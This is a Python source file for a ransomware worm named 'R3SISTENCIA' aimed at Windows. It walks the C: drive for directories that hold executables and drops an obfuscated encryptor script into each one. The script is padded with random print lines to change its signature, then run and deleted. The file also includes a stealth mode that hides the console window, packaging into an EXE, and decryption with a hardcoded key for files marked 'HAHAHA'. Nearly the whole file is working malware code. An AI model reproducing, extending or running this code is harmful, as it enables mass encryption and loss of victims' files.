import os
os.system("pip install pypiwin32 pyinstaller pycryptodome cryptography > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
import sys
import time
import win32con
import win32gui
import random
from cryptography.fernet import Fernet

ROOTDIR = r"C:\\"
THIS_DIR = os.path.dirname(os.path.realpath(__file__))
ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")
KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                if directory_path != THIS_DIR:
                    try:
                        for f in os.listdir(directory_path):
                            if f.endswith(".exe"):
                                self.target_dir_list.append(directory_path)
                                break
                    except PermissionError:
                        pass

        print("[*] Found " + str(len(self.target_dir_list)) + " targetable directories.")
        self.directories_found = True

    def spread(self):
        if not os.path.exists(THIS_DIR + "\\tmp"):
            os.mkdir(THIS_DIR + "\\tmp")

        to_infect = THIS_DIR + "\\tmp\\to_infect.py"
        to_infect_o = THIS_DIR + "\\tmp\\to_infect_o.py"
        with open(ENCRYPTOR_PATH, "r") as f:
            encryptor = f.read()

        count = 0
        for target in self.target_dir_list:
            times = random.randrange(1, 25)
            for i in range(times):
                num = random.randrange(-sys.maxsize, sys.maxsize)
                encryptor = "print(" + str(num) + ")\n" + encryptor

            with open(to_infect, "w") as tf:
                tf.write(encryptor)

            try:
                with open(target + "/hehe.py", "w") as f:
                    os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100")
                    with open(to_infect_o, "r") as fe:
                        f.write(fe.read())
                os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
                os.remove(target + "\\hehe.py")
                count += 1
            except PermissionError:
                print("PermissionError " + target)
            except FileNotFoundError:
                print("FileNotFoundError " + target)
        print(str(count) + " directories had their files encrypted.")
        os.remove(to_infect)
        os.remove(to_infect_o)

    def decrypt_files(self):
        if not self.directories_found:
            self.find_directories()

        count = 0
        for target in self.target_dir_list:
            try:
                for (_, _, filenames) in os.walk(target):
                    break

                fer = Fernet(KEY)

                for file in filenames:
                    if file.endswith("HAHAHA"):
                        print(file)
                        with open(target + "/" + file, "rb") as f:
                            data = f.read()

                        decrypted = fer.decrypt(data)

                        with open(target + "/" + file.split("HAHAHA")[0], "wb") as file_dec:
                            file_dec.write(decrypted)
                        os.remove(target + file)
                        count += 1
            except PermissionError:
                print("PermissionError " + target)

        print("[*] " + str(count) + " files were decrypted!")

    def execute_worm(self):
        if not self.directories_found:
            self.find_directories()

        self.spread()

def banner_func():
    print("""
  ___ _______ ___ ___ _____ _____  _  ___ ___   _   
 | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
 |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
 |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """)
        
def worm_menu():
    print(' --------------------------------- ')
    print('|      R 3 S I S T 3 N C I A      |')
    print(' --------------------------------- ')
    print('| [+] 1 => Launch Worm            |')
    print('| [+] 2 => Make It Executable     |')
    print('| [+] 3 => Run Worm in Stealth    |')
    print('| [+] 4 => Decrypt files          |')
    print('| [!] 0 => Exit                   |')
    print(' --------------------------------- ')

if __name__ == "__main__":
    os.system("cls")
    banner_func()

    worm = Worm()

    opt = int
    while opt != 0:
        time.sleep(0.5)
        worm_menu()
        opt = int(input("Operation: "))
        match opt:
            case 1: # modo normal
                print("[+] Running Worm!")
                worm.execute_worm()
                print("[+] Done!")
                time.sleep(1)
            case 2: # criação de executável
                print("[+] Creating EXE of Worm!")
                time.sleep(1)

                os.system("pyinstaller resistencia-exe.py --onefile --name resistencia")
                print("[+] resistencia.exe Created")
                time.sleep(1)
            case 3: # modo furtivo
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)
                worm.execute_worm()
                break
            case 4: # desencriptar ficheiros
                print("[+] Decrypting files!")
                worm.decrypt_files()
                print("[+] Done!")
                time.sleep(1)
            case 0:
                print("[!] Quitting...")
                time.sleep(0.5)
                break
            case _:
                print("[!] Invalid Option.")
                print("[!] Try again...")
    if os.path.exists(THIS_DIR + "\\tmp"):
        try:
            os.rmdir("tmp")
        except OSError:
            pass